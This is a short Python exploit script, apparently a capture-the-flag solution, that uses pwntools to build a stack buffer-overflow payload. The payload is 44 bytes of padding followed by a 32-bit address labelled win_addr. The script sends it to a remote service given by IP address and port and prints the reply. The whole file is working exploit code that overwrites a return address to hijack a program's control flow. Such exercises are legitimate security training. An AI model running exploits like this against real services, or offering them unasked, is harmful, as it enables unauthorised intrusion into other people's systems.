import socket
import time
from pwn import *

HOST = "45.33.118.86"
PORT = 9991

def recv_all(s, timeout=1.0):
    s.setblocking(False)
    data = b""
    start = time.time()
    while time.time() - start < timeout:
        try:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
        except BlockingIOError:
            time.sleep(0.05)
    return data.decode(errors="ignore")

# Craft payload
offset = 44
win_addr = 0x08049276
payload = b"A" * offset + p32(win_addr)

# Send payload
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.settimeout(5)
    s.connect((HOST, PORT))
    s.sendall(payload + b"\n")  # Send payload
    response = recv_all(s, timeout=2.0)

    print("=== Server Response ===")
    print(response.strip())
